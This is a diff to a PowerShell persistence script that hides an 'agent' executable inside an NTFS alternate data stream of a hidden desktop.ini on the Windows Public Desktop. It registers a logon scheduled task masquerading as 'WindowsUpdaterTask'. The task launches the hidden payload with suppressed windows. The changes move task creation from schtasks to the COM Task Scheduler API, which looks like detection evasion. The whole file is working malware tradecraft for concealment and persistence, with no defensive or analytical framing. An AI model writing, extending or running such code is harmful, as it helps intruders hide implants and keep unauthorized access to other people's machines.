@@ -2,38 +2,78 @@ param($args)
 
 $agentPath = $env:AgentPath
 if (-not $agentPath) {
-    Write-Output "AgentPath environment variable not set."
+    Write-Output "❌ AgentPath environment variable not set."
     exit
 }
 
-# ========== Carrier file on Public Desktop ==========
-$carrierFile = "C:\Users\Public\Desktop\desktop.ini"
+# ============================================================
+# 1. Choose carrier file (Public Desktop\desktop.ini)
+# ============================================================
+$publicDesktop = "C:\Users\Public\Desktop"
+$carrierFile = "$publicDesktop\desktop.ini"
 $streamName = "thumbs.db"
 
+# Create carrier if missing
 if (-not (Test-Path $carrierFile)) {
     Set-Content -Path $carrierFile -Value "[.ShellClassInfo]" -Encoding ASCII
     attrib +h +s $carrierFile
-    Write-Output "Created carrier file: $carrierFile"
+    Write-Output "[+] Created carrier file: $carrierFile"
+} else {
+    Write-Output "[+] Using existing carrier file: $carrierFile"
 }
 
-# ========== Hide agent in ADS ==========
-Write-Output "Hiding agent in $carrierFile`:$streamName ..."
+# ============================================================
+# 2. Hide the real agent in ADS
+# ============================================================
+Write-Output "[+] Hiding real agent in ADS..."
 $agentBytes = [System.IO.File]::ReadAllBytes($agentPath)
 Set-Content -Path $carrierFile -Stream $streamName -Value $agentBytes -Encoding Byte
 $hiddenPath = "$carrierFile`:$streamName"
+Write-Output "[+] Real agent hidden at: $hiddenPath"
 
-# ========== Create scheduled task to run hidden agent at logon ==========
+# ============================================================
+# 3. Create scheduled task via COM (no schtasks)
+# ============================================================
 $taskName = "WindowsUpdaterTask"
 $execCommand = "powershell.exe -WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"
 
-schtasks /delete /tn $taskName /f 2>$null
-schtasks /create /tn $taskName /tr "$execCommand" /sc onlogon /ru $env:USERNAME /f /it | Out-Null
+try {
+    # Connect to Task Scheduler
+    $taskService = New-Object -ComObject Schedule.Service
+    $taskService.Connect()
+    $rootFolder = $taskService.GetFolder("\")
 
-if ($LASTEXITCODE -eq 0) {
-    Write-Output "Scheduled task '$taskName' created. Agent will run at next logon."
-} else {
-    Write-Output "Failed to create scheduled task."
+    # Delete existing task if any
+    try { $rootFolder.DeleteTask($taskName, 0) } catch { }
+
+    # Create a new task definition
+    $taskDefinition = $taskService.NewTask(0)
+    $taskDefinition.RegistrationInfo.Description = "Windows Updater Task"
+    $taskDefinition.Principal.UserId = $env:USERNAME
+    $taskDefinition.Principal.LogonType = 3 # TASK_LOGON_INTERACTIVE_TOKEN
+
+    # Add logon trigger
+    $trigger = $taskDefinition.Triggers.Create(9) # TASK_TRIGGER_LOGON
+    $trigger.UserId = $env:USERNAME
+
+    # Add action (run PowerShell to launch hidden agent)
+    $action = $taskDefinition.Actions.Create(0) # TASK_ACTION_EXEC
+    $action.Path = "powershell.exe"
+    $action.Arguments = "-WindowStyle Hidden -Command Start-Process -WindowStyle Hidden '$hiddenPath'"
+
+    # Register the task (6 = UpdateOrCreate, 3 = InteractiveToken)
+    $rootFolder.RegisterTaskDefinition($taskName, $taskDefinition, 6, $null, $null, 3) | Out-Null
+
+    Write-Output "[+] Scheduled task '$taskName' created via COM. Agent will run at next logon."
+} catch {
+    Write-Output "[-] Failed to create scheduled task via COM: $_"
 }
 
+# ============================================================
+# Done (original agent remains – you can delete it manually if desired)
+# ============================================================
 Write-Output ""
-Write-Output "DONE. Agent hidden in: $hiddenPath"
+Write-Output "✅ PERSISTENCE COMPLETE"
+Write-Output "===================================="
+Write-Output "Real agent hidden in: $hiddenPath"
+Write-Output "Original agent still at: $agentPath (you may delete it after reboot)"
